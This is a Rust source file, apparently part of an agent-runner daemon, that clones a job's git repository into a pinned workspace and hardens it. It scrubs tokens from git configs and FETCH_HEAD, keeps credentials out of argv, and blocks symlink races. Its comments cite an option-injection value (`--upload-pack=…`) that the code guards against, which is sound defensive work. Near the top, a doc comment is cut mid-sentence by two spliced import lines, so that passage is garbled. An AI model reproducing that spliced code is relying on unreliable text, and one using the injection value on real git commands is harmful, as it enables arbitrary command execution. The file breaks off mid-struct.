//! Minimum repository provisioning: clone the envelope's repository into the
//! job's workspace so the agent runs inside a real checkout.
//!
//! This is the MVP slice — clone (honouring depth / single-branch / filter /
//! submodules / branch), optionally check out a pinned commit, and best-effort
//! fetch a base ref so `git diff base...HEAD` works. Push/finalize is a later
//! issue; the agent (or a future finalize step) owns committing and pushing.

use std::path::Path;
use std::time::Duration;

use anyhow::{bail, Context, Result};
use tokio::process::Command;

use crate::envelope::Repository;
use crate::safecwd::CwdHandle;

/// Upper bound on the size of a git metadata file (`config`, `FETCH_HEAD`, …)
/// the credential scrubber will read into memory. These files are influenced by
/// the remote repository, so an unbounded read is a remote/job-controlled
use crate::runtime::log;
use std::path::PathBuf;
/// git config/FETCH_HEAD while still bounding a hostile one.
const MAX_SCRUB_BYTES: u64 = 8 * 1024 * 1024;

/// The checkout directory name, relative to the pinned run dir. A single
/// literal component: it is passed to git as a *relative* clone destination
/// (resolved against the pinned run-dir cwd) and to [`CwdHandle::open_child`]
/// (opened fd-relative), so it must never carry a separator or a parent
/// component.
const CHECKOUT_DIR: &str = "repo";

/// Clone `repo` into the `repo` child of the pinned run directory `workdir` and
/// return the pinned checkout handle. `default_timeout` caps each git
/// invocation (overridden per-repo by `cloneTimeoutMs`).
///
/// Every git step runs *through the capability*: the clone executes with its
/// cwd bound to the pinned run dir and a RELATIVE `repo` destination (an
/// absolute destination would be re-resolved by the kernel at spawn, so a
/// same-UID actor swapping an ancestor after preparation could redirect the
/// clone's writes outside the validated tree, #35), and the follow-on
/// `set-url`/fetch/checkout steps bind the checkout pinned fd-relative to that
/// same run dir — no path is ever re-resolved.
pub async fn provision(
    repo: &Repository,
    workdir: &CwdHandle,
    default_timeout: Duration,
) -> Result<CwdHandle> {
    if repo.url.trim().is_empty() {
        bail!("repository has no url to clone");
    }
    if let Some(sha) = &repo.sha {
        if !is_hex_sha(sha) {
            bail!("invalid repository.sha {sha:?} — expected a 7–40 char hex commit id");
        }
    }
    let timeout = repo
        .clone_timeout_ms
        .filter(|&ms| ms > 0)
        .map(Duration::from_millis)
        .unwrap_or(default_timeout);

    // The checkout's path, for the scrub/removal helpers (which operate on
    // files, not cwds) and for messages. Recovered through the pinned fd so it
    // names the real prepared inode even after an ancestor rename; these
    // helpers re-validate each file no-follow before rewriting it.
    let workspace = workdir
        .path()
        .context("recovering the pinned run dir path")?
        .join(CHECKOUT_DIR);
    // `provision` binds every git step's cwd to the pinned run dir (#35), but a
    // relative *local* source (e.g. `./origin.git`) is interpreted by git
    // relative to *that* cwd — i.e. inside the still-empty run dir — so it would
    // no longer resolve to the path the envelope author meant (which, before
    // #35, was taken relative to the supervisor's own cwd). Re-anchor such
    // sources to the supervisor's cwd *once*, here, so the single resolved
    // `source` below drives clone, both fetches, AND the persisted origin
    // consistently. Remote URLs, scp-like SSH sources, and absolute local paths
    // are cwd-independent and pass through unchanged.
    let supervisor_cwd =
        std::env::current_dir().context("resolving the supervisor working directory")?;
    let source = resolve_local_source(&repo.url, &supervisor_cwd);

    // Lift any `user:token@` credential out of the URL so it is delivered to git
    // out of band (via the credential helper in `git()`) instead of embedded in
    // argv, where it would sit in world-readable `/proc/<git-pid>/cmdline` for
    // the life of every clone/fetch. `fetch_url` (credential-free) is what goes
    // on the command line; the same handle authenticates the clone and both
    // fetches below.
    let (fetch_url, cred) = split_url_credential(&source);
    let mut args: Vec<String> = vec!["clone".into(), "--no-tags".into()];
    if let Some(depth) = repo.depth.filter(|&d| d > 0) {
        args.push("--depth".into());
        args.push(depth.to_string());
    }
    if repo.single_branch {
        args.push("--single-branch".into());
    }
    if let Some(filter) = &repo.filter {
        args.push(format!("--filter={filter}"));
    }
    if repo.submodules {
        args.push("--recurse-submodules".into());
    }
    // `ref` is always a branch/tag name (there is no hex heuristic); a pinned
    // commit is checked out below via `sha`.
    if let Some(branch) = &repo.ref_ {
        args.push("--branch".into());
        args.push(branch.clone());
    }
    // `--` terminates git's option parsing so a job-supplied `repo.url` (or
    // workspace path) beginning with `-` can never be mistaken for a clone
    // option (e.g. `--upload-pack`).
    args.push("--".into());
    args.push(fetch_url.clone());
    // The destination is the RELATIVE `repo`, resolved by the clone child
    // against its pinned run-dir cwd — an absolute `<workdir>/repo` would be
    // re-resolved by the kernel at spawn, letting a same-UID actor redirect the
    // clone's writes by swapping an ancestor after preparation (#35).
    args.push(CHECKOUT_DIR.into());

    if let Err(e) = git(&args, Some(workdir), timeout, cred.as_ref()).await {
        // A failed clone can still leave a *partially populated* checkout — most
        // notably a `--recurse-submodules` clone whose submodule step failed
        // after the superproject was created — with the credential-bearing URL
        // already written into `<workspace>/.git/config` (and any nested
        // submodule configs). This early return would otherwise leave that token
        // on disk. Remove the whole partial checkout before propagating so no
        // failure path leaves credentials behind.
        remove_partial_checkout(&workspace).await;
        return Err(e).context("git clone failed");
    }

    // The clone wrote through the pinned run dir, so the checkout it created is
    // a direct child of that pinned inode; pin it fd-relative (never following
    // a symlink at the child) so every follow-on git step binds the same inode
    // the clone wrote, even if a path component is swapped afterwards.
    let checkout = workdir
        .open_child(std::ffi::OsStr::new(CHECKOUT_DIR))
        .context("pinning the freshly cloned checkout")?;

    // `git clone` now runs with a credential-free `fetch_url` in argv, so the
    // persisted `<workspace>/.git/config` origin already carries no `user:token@`
    // userinfo. This rewrite is kept as defense in depth — it re-canonicalises
    // the origin to the scrubbed URL right after the clone (a no-op when the URL
    // carried no credentials), so even if a future change reintroduced a
    // credential-bearing clone URL the agent could never read the PAT from the
    // persisted config. The clone and both fetches below authenticate via the
    // out-of-band credential helper (see `git()`), so the token is never written
    // to config or placed in argv.
    let scrubbed_origin = scrub_url_credentials(&source);
    if let Err(e) = git(
        &[
            "remote".into(),
            "set-url".into(),
            "origin".into(),
            "--".into(),
            scrubbed_origin,
        ],
        Some(&checkout),
        timeout,
        None,
    )
    .await
    {
        // The scrub itself failed, so the credential-bearing origin is still
        // persisted in the checkout config. Remove the whole checkout rather
        // than leaving the token on disk.
        remove_partial_checkout(&workspace).await;
        return Err(e).context("scrubbing persisted clone credentials failed");
    }

    // A `--recurse-submodules` clone also persists each submodule's
    // (possibly credential-bearing) remote URL into `<workspace>/.git/modules/**/config`.
    // The top-level `origin` scrub above does not touch those nested configs, so
    // an agent with read access to the checkout could exfiltrate the PAT from
    // them even though `origin` is clean. Scrub every nested submodule config
    // before returning the workspace.
    if repo.submodules {
        if let Err(e) = scrub_submodule_config_credentials(&workspace) {
            remove_partial_checkout(&workspace).await;
            return Err(e).context("scrubbing submodule clone credentials failed");
        }
    }

    if let Some(sha) = &repo.sha {
        // The commit may be absent under a shallow clone: fetch it, then check
        // it out detached. Fetch against the credential-free `fetch_url` and let
        // the out-of-band credential helper (see `git()`) authenticate — so the
        // token never lands in argv or in the scrubbed-`origin` config. `--`
        // terminates option parsing so neither the URL nor the sha can be read
        // as a git option.
        let _ = git(
            &[
                "fetch".into(),
                "--no-tags".into(),
                "--".into(),
                fetch_url.clone(),
                sha.clone(),
            ],
            Some(&checkout),
            timeout,
            cred.as_ref(),
        )
        .await;
        // `git fetch` still records the (now credential-free) source URL in
        // `<workspace>/.git/FETCH_HEAD`; the scrub is retained as defense in
        // depth before the (fallible) checkout below can return.
        if let Err(e) = scrub_fetch_head(&workspace) {
            remove_partial_checkout(&workspace).await;
            return Err(e).context("scrubbing fetch metadata credentials failed");
        }
        git(
            &["checkout".into(), "--detach".into(), sha.clone()],
            Some(&checkout),
            timeout,
            None,
        )
        .await
        .with_context(|| format!("git checkout {sha} failed"))?;
    }

    // Best-effort base fetch so a single-branch/shallow checkout can still diff
    // against its base. A failure here is not fatal — the head clone succeeded.
    if let Some(base) = repo.base_sha.as_ref().or(repo.base_ref.as_ref()) {
        let _ = git(
            &[
                "fetch".into(),
                "--no-tags".into(),
                // Fetch against the credential-free `fetch_url`; the out-of-band
                // credential helper (see `git()`) supplies the token so a private
                // base still authenticates without the secret ever reaching argv
                // (world-readable `/proc/<pid>/cmdline`) or the scrubbed origin.
                // `--` terminates option parsing so neither the URL nor a
                // job-supplied base ref beginning with `-` (e.g.
                // `--upload-pack=…`) can be read as a `git fetch` option,
                // mirroring the `git clone` URL guard.
                "--".into(),
                fetch_url.clone(),
                base.clone(),
            ],
            Some(&checkout),
            timeout,
            cred.as_ref(),
        )
        .await;
    }

    // The base fetch above (like the sha fetch) records its source URL in
    // `.git/FETCH_HEAD`. It is credential-free now that the token is delivered
    // out of band, but the scrub is kept as defense in depth before handing the
    // workspace to the agent so no fetch path can ever leave a token on disk.
    if let Err(e) = scrub_fetch_head(&workspace) {
        remove_partial_checkout(&workspace).await;
        return Err(e).context("scrubbing fetch metadata credentials failed");
    }

    Ok(checkout)
}

/// Best-effort removal of a partially provisioned checkout after a git step
/// failed. The checkout config may still hold a credential-bearing remote URL
/// (see the clone/scrub failure paths above), so it must not be left on disk. A
/// removal error is deliberately ignored — the checkout may not exist yet, and
/// there is nothing more to do about a filesystem failure here beyond the caller
/// already propagating the original git error.
async fn remove_partial_checkout(workspace: &Path) {
    if tokio::fs::try_exists(workspace).await.unwrap_or(false) {
        let _ = tokio::fs::remove_dir_all(workspace).await;
    }
}

/// Strip `user:token@` credentials from every submodule's persisted remote
/// config after a `--recurse-submodules` clone. Git writes each submodule's
/// remote URL (which, for a credential-bearing superproject, resolves to a
/// credential-bearing URL) into `<workspace>/.git/modules/**/config`; the
/// top-level `origin` scrub does not reach those nested configs. Walk every
/// `config` file under `.git/modules` and rewrite any embedded credential URL to
/// its credential-free form, so no token is left on disk for the agent to read.
/// The superproject's own top-level `<workspace>/.git/config` is scrubbed too,
/// since `submodule init` copies each submodule URL into a `submodule.<name>.url`
/// entry there that the `origin` scrub does not reach.
///
/// On Linux the recursion is performed entirely through pinned no-follow
/// directory handles (`scrub_config_tree_pinned`): `.git/modules` is resolved
/// **once** no-follow (`openat2(RESOLVE_NO_SYMLINKS)` on 5.6+, the `O_NOFOLLOW`
/// openat chain on older kernels) into a handle pinned by inode,
/// and every descendant is `fstatat`/`openat`'d relative to that handle, so a
/// same-UID actor cannot swap an approved directory for a symlink in the window
/// between the triage and the `read_dir`/open (the residual TOCTOU this closes).
/// Elsewhere the walk falls back to the path-based `scrub_config_tree_path_based`,
/// whose per-entry
/// `file_type()` check and atomic no-follow leaf open are symlink-safe but do not
/// pin the approved directory. Errors are propagated so the caller can remove the
/// whole checkout rather than return one that may still hold a token.
fn scrub_submodule_config_credentials(workspace: &Path) -> Result<()> {
    let modules = workspace.join(".git").join("modules");
    // Resolve the root with `symlink_metadata` (which does NOT follow symlinks):
    // `exists()` follows links, so a symlink planted at `.git/modules` would be
    // traversed into and `read_dir` could walk — and rewrite — files outside the
    // checkout. A genuine `--recurse-submodules` clone always creates
    // `.git/modules` as a real directory, so treat anything else (a symlink, a
    // regular file, or an absent path) as "nothing to scrub" and never traverse
    // it. The pinned (and path-based) walks below re-check this symlink-safely.
    match std::fs::symlink_metadata(&modules) {
        Ok(meta) if meta.file_type().is_dir() => {}
        Ok(_) => return Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(e).with_context(|| format!("stat {}", modules.display())),
    }
    // `git submodule init` (run by `--recurse-submodules`) also copies each
    // submodule's remote URL into a top-level `submodule.<name>.url` entry in the
    // superproject's own `<workspace>/.git/config`, which the `origin` set-url
    // scrub does not touch. Scrub it too so no persisted submodule URL source is
    // left behind (defense in depth — the token is supplied out of band and is
    // never written here, symmetric with the origin and nested-module scrubs).
    scrub_file_credentials_in_place(&workspace.join(".git").join("config"))?;

    #[cfg(target_os = "linux")]
    {
        use crate::saferoot::{DirHandle, PinError};
        match DirHandle::open_root_nofollow(&modules, false) {
            Ok(root) => scrub_config_tree_pinned(root, &modules),
            // The modules root was swapped for a symlink (or an ancestor
            // component became one) between the stat above and this pin: refuse
            // to traverse it rather than follow it outside the checkout.
            Err(PinError::Io(e)) if e.raw_os_error() == Some(libc::ELOOP) => Ok(()),
            Err(PinError::Io(e)) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
            Err(PinError::Io(e)) => {
                Err(e).with_context(|| format!("pinning {}", modules.display()))
            }
        }
    }

    // Non-Linux: the strict no-follow chain would refuse legitimate platform
    // symlinks in the workspace path (macOS `/var` -> `/private/var`), so use the
    // symlink-safe path-based walk, as before.
    #[cfg(not(target_os = "linux"))]
    scrub_config_tree_path_based(modules)
}

/// Pinned no-follow recursion for [`scrub_submodule_config_credentials`]: every
/// directory under the pinned `.git/modules` root is enumerated and re-opened
/// through a no-follow handle, and each `config` leaf is opened `O_NOFOLLOW`
/// *through its pinned parent*, so no component swapped to a symlink after it was
/// triaged can redirect the scrub outside the checkout. `display` is the root's
/// path, used only to build human-readable error context.
///
/// Two hardening properties shape the walk:
///
/// * **Strict enumeration.** Each directory is listed with
///   [`DirHandle::entry_names_strict`], which surfaces a mid-stream `readdir`
///   error as `Err` instead of silently treating it as end-of-directory. A
///   partial listing would otherwise be returned as `Ok`, letting the scrub
///   report success while an unenumerated `config` keeps its credentials — so
///   here a read error fails the whole scrub (and the caller then refuses to
///   hand out the checkout) rather than risk a missed credential.
///
/// * **Depth-bounded descriptors.** The walk is depth-first and holds open only
///   the current ancestry chain: a subdirectory's handle is opened, its subtree
///   fully processed, and the handle dropped *before* the next sibling is
///   opened. Sibling entries are carried by name, not by handle, so the number
///   of open directory descriptors is bounded by the tree's depth rather than
///   its width — a wide `.git/modules` (many sibling submodules) cannot exhaust
///   `RLIMIT_NOFILE`/`EMFILE`.
#[cfg(target_os = "linux")]
fn scrub_config_tree_pinned(root: crate::saferoot::DirHandle, display: &Path) -> Result<()> {
    scrub_config_dir_pinned(&root, display)
}

/// Depth-first worker for [`scrub_config_tree_pinned`]: scrubs `dir`'s own
/// `config` leaf, then recurses into each subdirectory in turn. `dir`'s handle
/// stays open for the whole call and is dropped when it returns, so at any
/// moment only the handles along the current ancestor chain are open.
#[cfg(target_os = "linux")]
fn scrub_config_dir_pinned(dir: &crate::saferoot::DirHandle, dir_path: &Path) -> Result<()> {
    let names = dir
        .entry_names_strict()
        .with_context(|| format!("reading {}", dir_path.display()))?;
    for name in names {
        let path = dir_path.join(&name);
        let meta = match dir.symlink_metadata(&name) {
            Ok(m) => m,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
            Err(e) => return Err(e).with_context(|| format!("stat {}", path.display())),
        };
        // A symlinked entry is never traversed or opened: skip it so the
        // scrub can never be redirected outside the pinned tree.
        if meta.is_symlink {
            continue;
        }
        if meta.is_dir {
            match dir.open_child_dir(&name, false) {
                // Descend with the child's handle held; it is dropped (closing
                // the fd) when this recursion returns, before the next sibling
                // is opened — so open fds track depth, not breadth.
                Ok(child) => scrub_config_dir_pinned(&child, &path)?,
                // Swapped to a symlink after the stat: skip, never follow.
                Err(e) if e.raw_os_error() == Some(libc::ELOOP) => continue,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
                Err(e) => return Err(e).with_context(|| format!("opening {}", path.display())),
            }
        } else if name == "config" {
            match dir.open_child_file_rw_nofollow(&name) {
                Ok(file) => scrub_open_file(file, &path)?,
                Err(e) if e.raw_os_error() == Some(libc::ELOOP) => continue,
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => continue,
                Err(e) => return Err(e).with_context(|| format!("opening {}", path.display())),
            }
        }
    }
    Ok(())
}

/// Path-based recursion for [`scrub_submodule_config_credentials`]: the
/// non-Linux fallback. Directory recursion
/// uses `file_type()` (which does not follow symlinks), so a symlinked entry is
/// never traversed into, and each `config` rewrite goes through an atomic
/// no-follow open (`scrub_file_credentials_in_place`) so a symlink planted at the
/// leaf between the `file_type()` check and the write cannot redirect the scrub.
/// It does not pin the approved directory, so a directory swapped for a symlink
/// between the `file_type()` triage and the `read_dir` is the residual TOCTOU the
/// pinned walk closes on Linux.
#[cfg(not(target_os = "linux"))]
fn scrub_config_tree_path_based(modules: std::path::PathBuf) -> Result<()> {
    let mut stack = vec![modules];
    while let Some(dir) = stack.pop() {
        let entries =
            std::fs::read_dir(&dir).with_context(|| format!("reading {}", dir.display()))?;
        for entry in entries {
            let entry = entry.with_context(|| format!("reading an entry in {}", dir.display()))?;
            let path = entry.path();
            let file_type = entry
                .file_type()
                .with_context(|| format!("stat {}", path.display()))?;
            if file_type.is_dir() {
                stack.push(path);
            } else if file_type.is_file() && entry.file_name() == "config" {
                scrub_file_credentials_in_place(&path)?;
            }
        }
    }
    Ok(())
}

/// Strip `user:token@` credentials from `<workspace>/.git/FETCH_HEAD`, which git
/// populates with the (credential-bearing) source URL of every `git fetch`. The
/// top-level `origin` scrub leaves that file untouched, so a private-repo fetch
/// would leave the PAT readable in the checkout the agent receives. Rewrite any
/// embedded credential URL to its credential-free form in place.
///
/// Symlink-safe: the rewrite goes through an atomic no-follow open
/// (`scrub_file_credentials_in_place`), so a symlink planted at `.git/FETCH_HEAD`
/// between any check and the write is never followed and cannot redirect the
/// write outside the checkout. A missing or non-regular file is a no-op.
fn scrub_fetch_head(workspace: &Path) -> Result<()> {
    let fetch_head = workspace.join(".git").join("FETCH_HEAD");
    scrub_file_credentials_in_place(&fetch_head)
}

/// Rewrite `path` in place with any embedded git credentials scrubbed, holding
/// the checked inode open for the whole read-modify-write so a symlink planted at
/// `path` between an earlier `file_type()`/`symlink_metadata` check and this
/// rewrite cannot redirect the write outside the checkout (a TOCTOU that a
/// separate `symlink_metadata`-then-`std::fs::write` pair leaves open).
///
/// On unix the leaf is opened `O_NOFOLLOW` (a swapped-in symlink fails the open
/// with `ELOOP`) and `O_NONBLOCK` (the leaf is attacker-plantable, so it could be
/// a FIFO whose open would otherwise block the worker thread — special files are
/// then rejected by the regular-file guard). On other platforms a symlink is
/// rejected explicitly (best-effort; such targets are not supported daemon
/// hosts). A missing or non-regular file is a no-op.
fn scrub_file_credentials_in_place(path: &Path) -> Result<()> {
    #[cfg(unix)]
    let file = {
        use std::os::unix::fs::OpenOptionsExt;
        let mut opts = std::fs::OpenOptions::new();
        opts.read(true).write(true);
        opts.custom_flags(libc::O_NOFOLLOW | libc::O_CLOEXEC | libc::O_NONBLOCK);
        match opts.open(path) {
            Ok(f) => f,
            // ENOENT: nothing to scrub. ELOOP: the leaf is a symlink (someone
            // planted one) — skip it rather than follow it outside the checkout.
            Err(e)
                if e.kind() == std::io::ErrorKind::NotFound
                    || e.raw_os_error() == Some(libc::ELOOP) =>
            {
                return Ok(());
            }
            Err(e) => return Err(e).with_context(|| format!("opening {}", path.display())),
        }
    };
    #[cfg(not(unix))]
    let file = {
        // No atomic no-follow open here: reject a symlink explicitly so the
        // documented no-symlink guarantee still holds.
        match std::fs::symlink_metadata(path) {
            Ok(meta) if meta.file_type().is_symlink() => return Ok(()),
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
            Err(e) => return Err(e).with_context(|| format!("stat {}", path.display())),
        }
        std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .open(path)
            .with_context(|| format!("opening {}", path.display()))?
    };

    // Only rewrite a real regular file; a FIFO/device/dir opened above is skipped
    // so the read below can never block or misbehave on a special file.
    scrub_open_file(file, path)
}

/// Read-modify-write the scrub on an **already-opened** file handle, used by both
/// the path-based [`scrub_file_credentials_in_place`] (which opens the leaf
/// `O_NOFOLLOW`) and the `openat2`-pinned [`scrub_config_tree_pinned`] (which
/// opens each `config` through its pinned parent). Holding the handle for the
/// whole read-modify-write is what makes the rewrite race-free; `display` is used
/// only for error context. A non-regular file (a FIFO/device/dir that slipped
/// past the open) is a no-op.
fn scrub_open_file(mut file: std::fs::File, display: &Path) -> Result<()> {
    use std::io::{Read, Seek, SeekFrom, Write};

    let meta = file
        .metadata()
        .with_context(|| format!("stat {}", display.display()))?;
    if !meta.file_type().is_file() {
        return Ok(());
    }
    // These files (`config`, `FETCH_HEAD`, …) are influenced by the remote repo
    // and by `git fetch`, so their size is ultimately attacker/job-controlled.
    // An unbounded `read_to_string` would let a hostile repo (a giant
    // `FETCH_HEAD` or a pathologically nested config) make each slot buffer the
    // whole file, exhausting the daemon's memory. Read at most `MAX_SCRUB_BYTES`
    // and fail the checkout if the scrub input is larger — a credential-bearing
    // git metadata file this big is not legitimate.
    let mut raw = Vec::new();
    std::io::Read::by_ref(&mut file)
        .take(MAX_SCRUB_BYTES + 1)
        .read_to_end(&mut raw)
        .with_context(|| format!("reading {}", display.display()))?;
    if raw.len() as u64 > MAX_SCRUB_BYTES {
        bail!(
            "{} exceeds the {}-byte credential-scrub cap — refusing to load it",
            display.display(),
            MAX_SCRUB_BYTES
        );
    }
    let contents =
        String::from_utf8(raw).with_context(|| format!("reading {}", display.display()))?;
    let scrubbed = scrub_url_credentials(&contents);
    if scrubbed != contents {
        file.seek(SeekFrom::Start(0))
            .with_context(|| format!("seeking {}", display.display()))?;
        file.set_len(0)
            .with_context(|| format!("truncating {}", display.display()))?;
        file.write_all(scrubbed.as_bytes())
            .with_context(|| format!("rewriting {}", display.display()))?;
    }
    Ok(())
}

fn is_hex_sha(s: &str) -> bool {
    let n = s.len();
    (7..=40).contains(&n) && s.chars().all(|c| c.is_ascii_hexdigit())
}

/// Credentials lifted out of a remote URL so they are handed to git *out of
/// band* rather than embedded in its argv. A `user:token@` URL passed on the
/// command line leaves the token in `/proc/<git-pid>/cmdline`, which is
/// world-readable on a default Linux host, so any local process can read the
/// PAT for the lifetime of the clone/fetch — scrubbing the on-disk
/// `origin`/`FETCH_HEAD` afterward does not close that live exposure. Supplying
/// the secret through git's credential-helper protocol keeps it in the child's
/// environment (`/proc/<pid>/environ`, readable only by the owning user)
/// instead.
struct GitCredential {
    /// Host (without port) the credential is scoped to, so the helper never
    /// hands the token to a differently-hosted submodule remote.
    host: String,
    username: String,
    password: String,
}

/// Re-anchor a *relative local* clone source against the supervisor's working
/// directory.
///
/// `provision` runs every git step with its cwd bound to the pinned run dir
/// (#35). A relative local source such as `./origin.git` or `../mirror` is
/// interpreted by git relative to *that* cwd — i.e. inside the empty run dir —
/// so it would no longer resolve where the envelope author meant it (before #35
/// the clone ran from the supervisor's own cwd). Join such a source onto
/// `supervisor_cwd` so clone, fetch, and the persisted origin all keep
/// resolving it the same way they did before the run-dir binding.
///
/// Only genuinely *local relative* sources are rewritten. These pass through
/// byte-for-byte because their meaning is independent of the launching cwd:
///
///   * a remote URL (`scheme://…` — a colon before the first slash), and
///   * an scp-like SSH source (`host:path` — likewise a colon before any
///     slash, or a colon with no slash at all), and
///   * an already-absolute local path.
///
/// The "colon before the first slash" test mirrors git's own rule for telling a
/// URL / scp-like remote from a local path, so a path containing a colon *after*
/// a slash (e.g. `./weird:name`) is still treated as the local path it is.
fn resolve_local_source(url: &str, supervisor_cwd: &Path) -> String {
    let first_colon = url.find(':');
    let first_slash = url.find('/');
    let is_remote = match (first_colon, first_slash) {
        (Some(c), Some(s)) => c < s,
        (Some(_), None) => true,
        (None, _) => false,
    };
    if is_remote || Path::new(url).is_absolute() {
        return url.to_string();
    }
    supervisor_cwd.join(url).to_string_lossy().into_owned()
}

/// The trusted source a finalize-time git operation (push, default-branch
/// lookup, post-error remote verification) must target: the SAME source
/// `provision()` cloned from. `provision()` re-anchors a relative *local* URL
/// (e.g. `./origin.git`) against the supervisor's cwd before cloning
/// (`resolve_local_source`); finalize runs with the *checkout* as its cwd, so
/// re-splitting the raw `repo.url` would re-resolve that relative path against
/// the wrong base and push/query the wrong (or a nonexistent) destination.
/// Re-apply the same re-anchor here, then lift any embedded credential out of
/// argv exactly as the clone did. Remote URLs and absolute paths pass through
/// unchanged, so this is a no-op for the common case.
fn trusted_fetch_source(url: &str) -> (String, Option<GitCredential>) {
    let supervisor_cwd = std::env::current_dir();
    let resolved = match &supervisor_cwd {
        Ok(cwd) => resolve_local_source(url, cwd),
        // If the supervisor cwd is somehow unreadable, fall back to the raw URL
        // rather than fail: remote/absolute sources are unaffected, and a
        // relative local source simply resolves as it did before this fix.
        Err(_) => url.to_string(),
    };
    split_url_credential(&resolved)
}

/// Split a remote URL into `(url_for_argv, credential)`: the returned URL has
/// any `user:secret@` userinfo removed (safe to place in argv), and the
/// credential — when the URL carried one — is returned separately for
/// out-of-band delivery via [`git`]'s credential helper.
///
/// The userinfo is split on its first `:` into username/password; a userinfo
/// with no `:` (the `https://<token>@host` token-as-username form) becomes the
/// username with an empty password, mirroring how git itself would interpret
/// the original URL. A credential-free URL yields `(url, None)` and is returned
/// byte-for-byte unchanged.
fn split_url_credential(url: &str) -> (String, Option<GitCredential>) {
    let sanitized = scrub_url_credentials(url);
    // Only the `scheme://[userinfo@]authority…` form carries an embeddable
    // credential; anything else (or a URL the scrub left untouched) has none.
    let Some(pos) = url.find("://") else {
        return (sanitized, None);
    };
    // Only lift a credential for the schemes whose userinfo `scrub_url_credentials`
    // actually strips — `http`/`https`. For other schemes (notably `ssh://git@host`,
    // where the userinfo is a *login*, not a secret) the sanitized URL still carries
    // the original userinfo verbatim, so extracting a credential here would both
    // leave that userinfo in the argv `fetch_url` AND additionally hand git a helper
    // credential — double-delivering a password-bearing non-HTTP URL into git's
    // argv/config. Leave such URLs untouched (no lifted credential), mirroring the
    // scrub's scheme scoping.
    let scheme = scheme_of(&url[..pos]);
    if !(scheme.eq_ignore_ascii_case("http") || scheme.eq_ignore_ascii_case("https")) {
        return (sanitized, None);
    }
    let after = pos + 3;
    let tail = &url[after..];
    let auth_end = tail
        .find(|c: char| matches!(c, '/' | '?' | '#') || c.is_whitespace())
        .unwrap_or(tail.len());
    let authority = &tail[..auth_end];
    let Some(at) = authority.rfind('@') else {
        return (sanitized, None);
    };
    let userinfo = &authority[..at];
    let hostport = &authority[at + 1..];
    // `hostport` is already past the last `@`, so it is `host[:port]`; scope the
    // credential on the bare host (git's `host` request field omits a default
    // port, and we strip any explicit `:port` before comparing).
    let host = hostport.split(':').next().unwrap_or(hostport).to_string();
    let (username, password) = match userinfo.split_once(':') {
        Some((u, p)) => (u.to_string(), p.to_string()),
        None => (userinfo.to_string(), String::new()),
    };
    if host.is_empty() || username.is_empty() {
        // Nothing usable to scope/authenticate with — fall back to the sanitized
        // URL alone (git will consult its own credential machinery as before).
        return (sanitized, None);
    }
    (
        sanitized,
        Some(GitCredential {
            host,
            username,
            password,
        }),
    )
}

/// Strip `user:secret@` userinfo from every `scheme://…@authority` occurrence in
/// arbitrary text (such as a git stderr tail). Git can echo a credential-bearing
/// remote URL in its diagnostics, and that text is propagated into job-failure
/// and daemon logs, so any embedded PAT must be removed before it is logged.
/// Non-URL text (and credential-free URLs) is returned unchanged.
fn scrub_url_credentials(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    let mut rest = text;
    while let Some(pos) = rest.find("://") {
        let after = pos + 3;
        // Credentials are only lifted/scrubbed for the schemes where git's
        // credential helper injects a secret: http and https. Other schemes —
        // notably `ssh://git@host` — carry a *username* in the userinfo, not a
        // secret, so stripping it would corrupt an otherwise valid remote
        // (dropping the SSH login and silently breaking the fetch). Leave those
        // authorities untouched.
        let scheme = scheme_of(&rest[..pos]);
        let scrub = scheme.eq_ignore_ascii_case("http") || scheme.eq_ignore_ascii_case("https");
        out.push_str(&rest[..after]);
        let tail = &rest[after..];
        // The authority runs until the first character that cannot be part of it
        // (path/query/fragment separators or any whitespace/quoting that ends the
        // URL inside surrounding prose).
        let auth_end = tail
            .find(|c: char| {
                matches!(
                    c,
                    '/' | '?' | '#' | '"' | '\'' | '<' | '>' | ')' | ']' | '}' | '|' | '\\' | '`'
                ) || c.is_whitespace()
            })
            .unwrap_or(tail.len());
        let authority = &tail[..auth_end];
        match authority.rfind('@') {
            Some(at) if scrub => out.push_str(&authority[at + 1..]),
            _ => out.push_str(authority),
        }
        rest = &tail[auth_end..];
    }
    out.push_str(rest);
    out
}

/// The URL scheme = the trailing run of scheme characters (`[A-Za-z0-9+.-]`)
/// immediately preceding `"://"`. Returns `""` when no valid scheme precedes it
/// (e.g. a bare `://` embedded in prose), which leaves that authority untouched.
fn scheme_of(prefix: &str) -> &str {
    let mut start = prefix.len();
    for (i, c) in prefix.char_indices().rev() {
        if c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.') {
            start = i;
        } else {
            break;
        }
    }
    &prefix[start..]
}

/// Conventional base-branch names the fallback-branch guard treats as "the base
/// you must never commit-and-push directly onto" even when no base was
/// configured — mirrors the Node plugin's `CONVENTIONAL_BASE_BRANCHES`.
const CONVENTIONAL_BASE: &[&str] = &["main", "master"];

/// The branch-cut decision recorded BEFORE the agent runs, consumed by
/// [`finalize_git`] afterwards. Mirrors the Node plugin's `provisionRepo`
/// working-branch selection feeding `finalizeGit`.
pub struct GitPrep {
    /// The branch ref `finalize_git` anchors commit discovery and the
    /// side-branch sweep to, and pushes when `want_push` is set. It is populated
    /// even on a no-push run: `prepare_work_branch` deliberately preserves the
    /// checked-out branch when push is disabled so finalize can still enumerate
    /// it, and `want_push` alone governs push eligibility — NOT whether this
    /// field is `Some`. `None` therefore means no branch ref was prepared at all
    /// (a detached HEAD, or a failed branch cut), not that `branch.push = false`;
    /// finalize then has no branch to enumerate or push.
    pub working_branch: Option<String>,
    /// Whether the envelope asked for a push (`branch.push`, default true).
    pub want_push: bool,
    /// HEAD at provision time, so finalize can enumerate the agent's new commits
    /// (`rev-list start_sha..HEAD`). `None` for an unborn/empty base.
    pub start_sha: Option<String>,
    /// Every local branch tip at provision time (`branch -> sha`), so finalize
    /// can distinguish a branch the agent created/advanced after provisioning
    /// from one that merely pre-existed. `None` when the snapshot failed —
    /// finalize then cannot prove any side branch pre-existed and fails closed.
    pub provision_tips: Option<std::collections::BTreeMap<String, String>>,
    /// Every commit SHA reachable as a ref TIP at provision time — local heads
